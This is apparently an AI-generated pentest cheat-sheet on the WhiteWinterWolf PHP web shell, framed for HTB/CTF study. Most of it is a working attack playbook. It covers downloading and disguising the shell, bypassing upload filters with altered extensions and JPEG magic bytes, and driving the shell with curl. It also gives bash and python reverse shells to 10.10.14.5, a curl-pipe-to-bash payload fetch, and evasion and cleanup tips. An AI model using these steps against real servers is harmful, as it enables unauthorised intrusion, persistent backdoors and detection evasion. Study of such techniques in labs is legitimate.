# WhiteWinterWolf PHP Webshell

**Tags:** `#wwolfphp` `#webshells` `#php` `#payloads`

Clean, single-file PHP web shell with a browser-based UI. Provides command execution, file browser, file read/write, and download. Commonly used in HTB/CTF when a PHP file upload vector is available. Lightweight and well-featured compared to basic `<?php system($_GET['cmd']); ?>` shells.

**Source:** https://github.com/WhiteWinterWolf/wwwolf-php-webshell
**Install:** `wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php`

```bash
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
```

> [!note]
> **No auth by default** — `$passhash` is empty, so anyone who finds the URL can use it. To lock it down, generate a hash with the repo's `passhash.sh` and set `$passhash`/`$passprompt` at the top of the file. The shell is a known signature; rename the file and/or modify it slightly to avoid AV/WAF detection.

---

## Setup & Upload

```bash
# Download
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php

# Rename to blend in
cp webshell.php image.php
cp webshell.php config.php

# Optional: bypass extension filters — try double extensions
# shell.php.jpg, shell.phtml, shell.php5, shell.pHp

# Upload via file upload vulnerability, then browse to:
http://target/uploads/image.php
```

---

## Bypassing Upload Filters

```bash
# Rename extensions to bypass blacklist
mv webshell.php shell.phtml
mv webshell.php shell.php5
mv webshell.php shell.php7
mv webshell.php shell.pHp      # case variation

# Add magic bytes for image bypass (prepend JPEG header)
printf '\xff\xd8\xff' | cat - webshell.php > shell.php.jpg

# Modify Content-Type in Burp during upload:
# Content-Type: image/jpeg
```

---

## Usage

Browse to the uploaded file — the shell provides:
- **Command field** — run OS commands
- **File browser** — navigate the filesystem
- **File viewer** — read files
- **Upload** — push additional files to the server

Commands are read from **`$_POST['cmd']` only** — there is no `?cmd=` GET support (a common misconception). For scripted/automation use, POST the field:
```bash
curl -s http://target/uploads/shell.php -d 'cmd=id'
curl -s http://target/uploads/shell.php -d 'cmd=whoami'
# If a password is set, add: -d 'pass=YOURPASS'
```

> [!tip]
> Use the shell to upload a more capable payload (netcat, meterpreter) or execute a reverse shell one-liner.

---

## Upgrade to Reverse Shell

From the web shell command box:
```bash
# Bash reverse shell
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# Python reverse shell (if bash fails)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# curl + execute
curl http://10.10.14.5:8000/shell.sh | bash
```

Kali listener:
```bash
nc -lvnp 443
```

---

## OPSEC

- Web shell written to disk — detectable by FIM and AV/EDR
- The file is a well-known signature — AV may flag on upload or execution
- Rename the file and change function/variable names for evasion
- Remove after use: from web shell run `unlink(__FILE__);` or `rm /path/to/shell.php`

---

> [!note] **See also** — Multi-language webshell collection (ASPX/PHP/JSP/CFM): [[Tools/Payloads & Shells/Laudanum|Laudanum]]. PowerShell/ASPX interactive console: [[Tools/Payloads & Shells/Antak|Antak]]. Getting the file past upload filters: [[Class notes/HTB Academy/CPTS v2 (claude)/File Upload Attacks|File Upload Attacks]]; staging/transfer: [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]].

---

*Created: 2026-03-13*
*Updated: 2026-08-31*
*Model: claude-opus-5*
